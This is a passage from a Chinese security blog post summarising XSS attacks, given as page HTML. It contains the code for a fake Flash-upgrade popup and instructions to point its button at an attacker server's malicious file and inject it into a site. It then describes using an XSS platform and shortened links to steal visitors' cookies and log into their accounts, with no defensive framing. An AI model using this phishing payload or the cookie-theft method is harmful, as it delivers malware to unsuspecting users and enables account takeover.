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&#x27;)&#125;#foot&#123;background-color:rgba(248,248,248);height:257px;border-radius:0px 0px 10px 10px&#125;#warnning&#123;font-size:24px&#125;#content&#123;position:relative;width:534px;height:180px;margin:0px auto;top:30px;z-index:8888&#125;#contentValue&#123;font-size:17px&#125;#button&#123;position:relative;width:141px;height:40px;border-radius:4px;background-image:linear-gradient(to bottom right,rgba(248,217,25),rgba(252,195,0));background-image:url(&#x27;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIwAAAAoCAIAAACjL4WRAAAACXBIWXMAACTpAAAk6QFQJOf4AAASGUlEQVR42tVYa2xc13FeUiGXFHdJ7q7IXT4c7V39ipvWhmTHTuzYkorWzQORqCCxm5iUncJooyf6AIwWTi3LadrqjbRAgTQIEsSiScoJXKBFYcWSKIqUyN0luZQVS66BpEBRkSwCxDCSH+bee7czZ86ZO/exS+aXW2FwfM658/jmm5l7l4598N4btZ8/4L7TB1L7j/4PSwhAWD5ESB8KfraC1Xm33/3PBz54799j7s92bMRpPRD/1+T/O34lWQUYV+fdnPPzHbHanSyXDuV2LlKcOyi/WbDbqF+706dCZPVKrKmgGtAdvXHu9GL7REWhS8LAIh95m/Xwh/xnlfSZNSKuBGD0I0wgEVLDlN9BPmkNeehbBz/ue/V6uxfWmPoP2iBZt3OKUy18VBvF8u1eWnnDCpqLt7PeijFwBQFlWpVVTnnIiU2vf+MJZS7z16u/BmHwAfzCoc6CM/KLhERue42fLPFA3HGC9NR5u0fq+3M0OobksPjQ6t418N7JYpHs2z2G3B6s2ds9oUpkQYGe+hlch3STD9aJzVUs2qibd/oCsfxk1ZkM0Q1+icYfLn89AXNiPNQ6OemNswgllZWGirdsGGdD/MHuiQnuehgii0elcQ1i/3SLfGr/VOYWRB/2WS+EPIqnXia+MfUrbxw/Z2GOgdyz9VJokEi9R8aVrxgbwJ8N+Im5pGQkMhhUhdXC6walBtlGOYd78h8pTghVg7i1OmQF8G8EfKOuitpsxI/r39ejKExvzIGxMIIPDF/ynsW+leFVSUZaSYWQZpQ3E7Sq1TKwB5NA9MZOwrIR/AF4gcTrmfN9PbWAQz5SUhtJJICB1hghdt/y3MkcApvItCOVAyzIo30rLXWgNtJ5QKd2awuvCFrhpGNjWReSwJ9u4ESa+72lAzohZtIyImMO+4wUypT0Y3TGq5tpcER7Fr6JAgogtAmr8ZEwsSFtjNs0rTXFPhSJ9NkDIAEhSHTDtsJJBM4N4pfchTVpU487BgPgq5gIZmHrRHQWenTeClrpVruZDmch8YPbgFpMUQakpKQNc0RiL6UMcSwZ5S5Fx6r2QFbkCq3YifCZonChDerbtwhiWmc4lRu2+somFoPEhG9mOBaHwHvAsMTgUzIRggrOVf76BnR02W7qfYAH6QGfLulAhJyzQOfiSMxUNbccKx3ZYZJwRm4MMcEYB6OU6knN8MjGnLZ5muJ7s+GblEEQFM7TNRiotEjEUjcUab9VKBzZYjJMh2qQEptAIilGTrBdbetrkdpbTB8nm/L8X+grWIOlm90iixS1C3QJwBuxBi9MSfMUF16ncysjfKZErNS6QiYgMeDCsNPteEx1B1YH1opYb5oVfKn16g/6n9r78Se/8NuTPxzQJTQ6rjn6HAoPapO2lXNcSYjlCwOWZR2/4AXSjwSM5XODlv9fIW/lYQSR3C0vWYXA0+FzaOX6AWDcyeyw56K/vITR89ZAiVgWQialI1Z+X3Zlqcu9mhvJW+F/+TzcwpvAz35FMywJbyCgFltX1TUNzvSRSXWh6+5kT3Gi7zsvb3v6S7/10B88/difjt56/ak/+cqnv/rFj3/nm1bltdx/X+nl1vYoJg9eJQRZFVWYCm5ck0/p6ODxiQyZYxdzRU3JV84OAFnL3jSnV84MWqpIVVWkkbOmqEvd40PW/nN6TA2z2zSnysQWwGoTfVCk+ZsZ5sGr02QWx+gKKsOAwrp69p7Cvt6VJaW2hAihitYXc3Tjb7I0gXH9tXfr8B8LsGabvcej/56J/qOn7n1g12cf2vP1R/f/zc6/+NHOl2+AuJVnQN791z/83rc++9eHd+/73CPPffVex+9KikaGeW45FtWM5t/WqH1fSdXy7tlB4gK/nWoc756F+cvSJB3LqyJRxEpqYh8eA9nRPbxXdeIVPVvueD9GWeqy/YTAHvSHzyLX2BAYvWv1nIah3wdXe2AuKTQBY88NxI4qARbJrnRFG1S66BGsRCUfQT7x4P07X7hItSHZbYrE8j/Xnv7kJ++TIaQHuqlVQqHFSw9DL3b5DBeNjnICT9Uk9QA7WpOIs/rmwaSSgkkaPpOiZncUuftPewBqlU7yCff5Q2kAI7O2J3L5fG5e8KNbary/sC+3Uul0Khmc1MPp1Upq+fSANQQw0BwwlI/iaM4rb4QTxDZHyYbMLsC/LhJZMnEg1cVO3ktjdUwSESAPP3z/ruPTUJtd35zd7RXpWVUeWp/5dWn40U/9DmYl8EnEvCH/EFq96Hvuqihw9LULFAbZzFuHzetC2a6eGYyavCxMgCmS5wTM9XGxW+b42lDBOpyRCDHEWB++Ng0MddlpX84M5wfGrqDO6pmBggGzfKbfKgxOXE4i8koaXgwYaEGTyb3oLiYlFWEJ8x/zaFropL2kL1BtuIFg1cUEKD+x+77H/vLfdqva/O7LxahJevb9GyOgpl0puAH/IIBJbZLqMgmpwg+qC5eT5r5LPO1yrvTih2SoZ3lRtctCAifpdD/crC6w5+SKet3RJB0rYJEoF5gb+CY9fbrLMJUkVLCO7bOg9owHSogtMpYtFHLzBjnVyR3Pec0wlCEkoIBfIMuCMUWdV/tky7w0xgwTbJmaT7iosndjkCfZ8BoQez7Je8pBpZH82pP3PnrkB3qGjs9Fvu4qP/7Ss1/+mDQPY+Io7rwCcCkzbFJlE03cfAe+UizrxTFjoi5X1HuGyHJ12dQ3CRQW0sesrSOnuhjA+NA2qBlViBKhEDBh+UMpRWWC2wiKhBO5QAwkZG/hTA9ly6pfCXn5UKGAn1UV16QGY4e/Ly7pFALc8k0k88yMr0gNpLZACgm++bs/zz/23DmapN3ms8QvOpLzpz7/t3+2TfhJhMuviE7Ke2j2/N40kB7oEmQ8r5tX6qsiZVYXdJEgCryF8IOPN93wutt/xguNv+7UETht8EMlX4A/0Aryt5/+dyilSpIsH+yfuJRQbrXMHwZs2ZeGYG50XqCJ70CFTaSfkIXhZhUlSPg3iRh0opIkiSuiwr1ckSyl7JSRjsnv9b7wxw//6srjJL++sgvW7Ude23FkYsfRH+04jJvtvz9y6btZMK8toq0OrBziqjauCUGXcATS4Yfv+KWECpeslvXGGcX3zP5TSRo7W3lAIk4Oyr+QzN8oufICuO2Cuo6cTtoGORQJBkukqeiY74B7KAChIs/oHN9a2XmVOOGnjpFfQfxjCAzLyQt7wYMaPqhKmZLqghZ55nQnhUYRziPFVYQE+I8ZWEnyAlfV8mZaffZkTGFKCaDmg2LHnifu/8XFx706XX78gaMXoELboU5QocOvPrLzU+9PIwW28mb7fdIRi0Sb+U4ICsfqTzLw4QEqoTyqGNQ6neVDeSzemx0axkI7Al5oXz6F3bpcRp9VxQ7c5Av42nHKOElQJEpNF+lEpwegjM7BCifsZBekRvcQF3WwLZQfU2O8LOM44pdmtB30yQQxF3QgqBaGKCeh27ZavWSOgeY7uRJmNoISyVUssp6sx5uq2nPl3DJGPfu8NfqtR3SFJnfSJGGdoEKwefIbp57/qJd22ec8gAPLMI+kY++UEmN788Q78Yhxy50wE/mD3YFmBAUq0koJj7XRXP5gp/aMhUGr4ZOdyKZqRC6Sa5yTJjGLKS+0u2Co8q2pIpVK7R7U0ma2RZ9KDcGDZn7gwpvKp9qPjULZTEOUPGUnPAD1+ddFIsvGgjE4baqWwv3eVHLf5+77r395jIcJakNvvO0Hfrhz1yPLb4J+m3HSxg7JPBwF7knunsRfR8fOb2agqyf74SNx/LyXgHZSSqyc6CvsTUOR1DGJ77eTCXqqJ+lkgv1gkU56fDmlRLUIeXXDj8CXRjs8JEVVj1d7qUi6w+AVUvZ6F0KUDsL7bmD8J1D7rYABu0oVo3wAP2bwZV0pt3uMQ0OU2sCKByBaiu2SIjVJJV0DAldPyFhZtsEGb9R66Z97jw4/9KvLO9+f/DQUib5G2w+P3/97X37927mAc3bC9eBL0kQuKOLF1LCF73oIp9RgtgpezqreZA4C9bP2pHCSyMPF1IiVJ8YV+9u4ZnaxY2JPfvhEB2PQcc9neWI4O4T6Su+2PN7rkpd0ImrCLNVGAC9uj/bAl0lHRPAZ+n+A2DpFiBL3GIf3iogbTXWxnQPRJqbRlNppExZj1ibtOUm7GD/7V1uff+7BX76piqS+Rjue2P8PL3yUPbhzjZwL/1D+OK12CT/4QIG62WwjiWoCtGEchDDDU5qkZaSjvXRA/xgrFPrH3gDzDvxj9gRptpk587hAJ3MJGCPrYMKPLY7raI9l9cyTrQbctvz3OfzgzbURb9ViAv8fLnRJWWXxSi+G39O1XEwco1/kc22SCixqsX1d8SpCReJzZKl8JPJbi7gr6nj/9OI9X/nCJ4rff3T717794OOf+cdv3NMovADNRSKHkAB3MfCrK1FKQPsDLyV4ofl5pHGEIpmfWtvyha0wKO5cHKqVH+peLnbi6+5Eiv9fOJRz1ZsYHFP4/sHl3WJcdgCl5p6HEdkCk1QrbgZ+BTZP8PMJX6A3sIkBJzcTFUO997z2Aj8bqZAoFXZtzPbARYMgTmGV5IYkvvhqamTfvSBL4xnpM9IJu+KN+ghtDfylIv6Hf/Af/RGDLy5qZPrD/hUPIdwfK/SPv9H5Iqrp0NW5VgOgFWusmx1nhTBDzaDAXqlwgnuKxba1otJXTpxZLwtHNRBMvDvXoSqULc3GPU1oO1gv4o9V60CnJnnWx6TYx8O8KVetMcBEemBMK7aMWk1ibRKcXM2m1ZmlHFqVkzi5UkS0K15amaB6omC0Cp1W5aeVnKtAml8CphDGlWE7vGGeObFZ3HtZ4Kssb8FTRgse1mZb8DjbcSxfyB/ooCgEHlbyAyt5hkkqezgjUqDcDdo204hx8iaEiNLEBipEEb24Hv/oPAau4YoFEgCxb7So+1baqLXNaMIxzisxxUmCJgbWVnEykfphMbGoDKgGbcvlh6PA0CrLRhFNiBaRhb5RtnHKWbN5owUAkxptYKX+MA0eVyl4Oa7N4gY4Me2om1JsdG0oHKVP5BKqAJmqD3RHqnZpVZyjIa0KeQsFJcAxJpS5CJAi7yX7UpPMq9c/4teU3HGBWyLFxFIwrvsK49dpg6eiDLoSfmCaaH+TSZxahwSo4XsKbZ7G4eje8HWDiNsS6CFhiJsAG4RN8R5nQ3/uXmEk/yAxJ8AUrAzi+kd4lcHUjY5hsmoxLRCnMKxmzOP+HHz4KB+K7gK+mdaACUHyQRUtohvf/wjjitBcCcmjXjWbcaYPp+S6wDCj/TvKLaK9HmdgeFSra7h2RW0C6ZN5iFLDfJ0mVkUylo6/MJQnKejimWNQIA1x1DrGsy2OYYdGmqWOVxLyoNdmn3NNHxHX6iuMWtdmNlVvNHO7OMKnbXxWZzbJo3NjUzARVUXOwhFZeK3D1FP7ityrRM5Mq1Bo8RL0p2wb2iX/WCSND/JR4iGe2RQuBl2yspEmul+bbl4LPvLcBhzWU3NnBH2Qm7ZtMo+aKaIz3aIeNVN0Emd6E+iQB659VTQBmhB9M5sAKmiyoVaOgrRmMFQNEpz4GfLcTDekjA69TJs5cQoEUYxas2QyzEaA9hgwiw90zj5teAR+SUyMJrGuI860ymfaUHAttq5JZK9IPCx0bOxE4g8LEBfIIhAuspOYCkpKUr8uGJlCPfy6G2h/LWZfawaJYbBrlEwT3NZLibRBAkCJCKZDHsmtce75kZfkk0wkepFGU6Q0YL+xMACSMGW0qWeuuGuWOnTD9yDsmfKq08H1hFNrUk6wIlSrWHUqZl9tor0UU7mmdS/rSLOofRMFDtBkiGuSbhGPfw1E3yCMsE95yUHr5Ri4kYZhJPUgQVyZSGNlDdUUno7m2VRzdaop7DHAeGANUBkwdPxAHfFIbmSgeq4ai7TaiG0gygbjyqcBtXA6v1EKfvxNMC1cDtioIhUH4BaukNOpumnrqGINX9p1jtrtlC5bPY7ko7Wreq1LInkTm43gbyAU0UM1FRTnWrDPAj3h+NsxUDDpvxH+aTTBxKeNn7nB2Acrr9uzg9rFJFYSRB2b8DiJr0FYHS98kz3Fa6x6VRXjqqkKH6+iwpq5pw16m/LpeyaTMQ5HEWkTZkrqsyab18MvPUiH4C0yhUihvKjZ64nEo6mDaWio4MevyqkCIWmzg1Cg/wWEew8JKsvIDgAAAABJRU5ErkJggg==&#x27;);font-size:18px;line-height:40px;margin-right:50px;text-align:center;float:right;z-index:9999&#125;#button:hover&#123;cursor:pointer&#125;&lt;/style&gt;&lt;div id=&#x27;main&#x27;&gt;&lt;div id=&#x27;flash&#x27;&gt;&lt;div id=&#x27;head&#x27;&gt;&lt;/div&gt;&lt;div id=&#x27;foot&#x27;&gt;&lt;div id=&#x27;content&#x27;&gt;&lt;font id=&#x27;warnning&#x27;&gt;\u60a8\u7684flash\u7248\u672c\u8fc7\u4f4e\uff0c\u8bf7\u53ca\u65f6\u5347\u7ea7\u5230\u6700\u65b0\u7248\u672c\uff01&lt;/font&gt;&lt;br&gt;&lt;br&gt;&lt;p id=&#x27;contentValue&#x27;&gt;\u7cfb\u7edf\u68c0\u6d4b\u5230\u60a8\u7684flash\u7248\u672c\u8fc7\u4f4e\uff0c\u6709\u88ab\u6f0f\u6d1e\u653b\u51fb\u98ce\u9669\uff0c\u4e14\u4e25\u91cd\u5f71\u54cd\u6e38\u620f\u3001\u89c6\u9891\u4f53\u9a8c\uff0c\u5347\u7ea7\u5230\u6700\u65b0\u5b98\u65b9\u6388\u6743\u7248\u672c\u83b7\u5f97\u66f4\u597d\u7684\u4e0a\u7f51\u4f53\u9a8c\u3002&lt;/p&gt;&lt;/div&gt;&lt;div id=&#x27;button&#x27; onclick=window.location.href=&#x27;&#x27;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&quot;</span></span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            $(<span class="string">&quot;.layui-layer&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;background&quot;</span>, <span class="string">&quot;none&quot;</span>);</span><br><span class="line">            layer.<span class="title function_">open</span>(&#123;</span><br><span class="line">                <span class="attr">type</span>: <span class="number">1</span>,<span class="comment">//Page层类型</span></span><br><span class="line">                <span class="attr">move</span>: <span class="literal">false</span> ,<span class="comment">//禁止拖拽</span></span><br><span class="line">                <span class="attr">area</span>: [<span class="string">&#x27;613px&#x27;</span>, <span class="string">&#x27;324px&#x27;</span>],<span class="comment">//设置弹窗大小</span></span><br><span class="line">                <span class="attr">title</span>: <span class="literal">false</span>,<span class="comment">//关闭标题栏</span></span><br><span class="line">                <span class="attr">shade</span>: <span class="number">0.5</span>,<span class="comment">//遮罩透明度</span></span><br><span class="line">                <span class="comment">//maxmin: true ,//允许全与屏最小化</span></span><br><span class="line">                <span class="attr">closeBtn</span>: <span class="number">0</span> ,<span class="comment">//取消关闭按钮</span></span><br><span class="line">                <span class="attr">anim</span>: <span class="number">0</span>,<span class="comment">//0-6的动画形式，-1不开启</span></span><br><span class="line">                <span class="attr">offset</span>: <span class="string">&#x27;100px&#x27;</span>,<span class="comment">//设置顶部距离</span></span><br><span class="line">                <span class="attr">scrollbar</span>: <span class="literal">false</span>,<span class="comment">//禁用滚轮</span></span><br><span class="line">                <span class="attr">content</span>: content</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>修改跳转路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;div id=&#x27;button&#x27; onclick=window.location.href=&#x27;http://服务器ip/path/恶意文件&#x27;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>插入到一个页面</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;flash.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gcore.jsdelivr.net/gh/mujietongxue/blogcdn@main/img/flash.png" class="lazyload" data-srcset="https://gcore.jsdelivr.net/gh/mujietongxue/blogcdn@main/img/flash.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="flash"></p>
+<p>点击<code>立即升级</code>会下载恶意文件</p>
+<p>一些别人的flash钓鱼项目：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Wileysec/adobe-flash-phishing-page">adobe-flash-phishing-page</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/r00tSe7en/Flash-Pop">Flash-Pop</a></p>
+<h3 id="xss-platform"><a href="#xss-platform" class="headerlink" title="xss platform"></a>xss platform</h3><p>可以利用一些xss平台生成的链接钓鱼</p>
+<p><img src="https://gcore.jsdelivr.net/gh/mujietongxue/blogcdn@main/img/platform.png" class="lazyload" data-srcset="https://gcore.jsdelivr.net/gh/mujietongxue/blogcdn@main/img/platform.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="platform"></p>
+<p>在网站上插入<script>标签</p>
+<p><img src="https://gcore.jsdelivr.net/gh/mujietongxue/blogcdn@main/img/script.png" class="lazyload" data-srcset="https://gcore.jsdelivr.net/gh/mujietongxue/blogcdn@main/img/script.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="script"></p>
+<p>复制网站链接生成一个短链接</p>
+<p>只要有人点了链接就会获取登录信息得到cookie借此登录他人账号。</p>
+<p><img src="https://gcore.jsdelivr.net/gh/mujietongxue/blogcdn@main/img/cookie.png" class="lazyload" data-srcset="https://gcore.jsdelivr.net/gh/mujietongxue/blogcdn@main/img/cookie.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="cookie"></p>
+
+  </div>
+  
+  
+    
+    <div class='footer'>
+       <!-- 参考资料、相关资料等 -->
+      
+       <!-- 相关文章 -->
+      
+      <!-- 版权声明组件 -->
+      
+      <!-- 打赏组件 -->
+      
+    </div>
+  
+  
+    
+
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-07-28T22:17:31+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Jul 28, 2024</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/web%E5%AE%89%E5%85%A8/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>web安全</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/xss/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>xss</p></a></div>
+  <span hidden itemprop="keywords">web安全 xss</span>
+
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2024/07/28/xss%E6%80%BB%E7%BB%93/&title=xss总结 - blog&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2024/07/28/xss%E6%80%BB%E7%BB%93/&title=xss总结 - blog&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2024/07/28/xss%E6%80%BB%E7%BB%93/&title=xss总结 - blog&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+    <!-- Custom Files bottomMeta begin -->
+    
+    <!-- Custom Files bottomMeta end -->
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2024/07/25/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/'>
+          <p class='title'>SQL注入总结<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>一、sql注入概述SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现...</p>
+        </a>
+      
+    </div>
+  
+  <!-- Custom Files postEnd begin-->
+  
+  <!-- Custom Files postEnd end-->
+</article>
+
+
+  
+
+
+  <article class="post white-box shadow floatable blur" id="comments">
+    <span hidden>
+      <meta itemprop="discussionUrl" content="/2024/07/28/xss%E6%80%BB%E7%BB%93/index.html#comments">
+    </span>
+    <p ct><i class='fa-solid fa-comments'></i> 评论</p>
+    
+
+    <div id="layoutHelper-comments"></div>
+
+  </article>
+
+
+
+
+
+
+</div>
+<aside id='l_side' itemscope itemtype="http://schema.org/WPSideBar">
+  
+
+  
+    
+    
+      
+    
+  
+
+
+<div class="widget-sticky pjax">
+
+  
+  
+
+
+  <section class="widget toc-wrapper desktop mobile " id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-text">分类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF"><span class="toc-text">注入思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="toc-text">常用的注入语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss%E7%BB%95%E8%BF%87"><span class="toc-text">xss绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%90%E4%BA%9B%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-text">某些特殊字符绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" 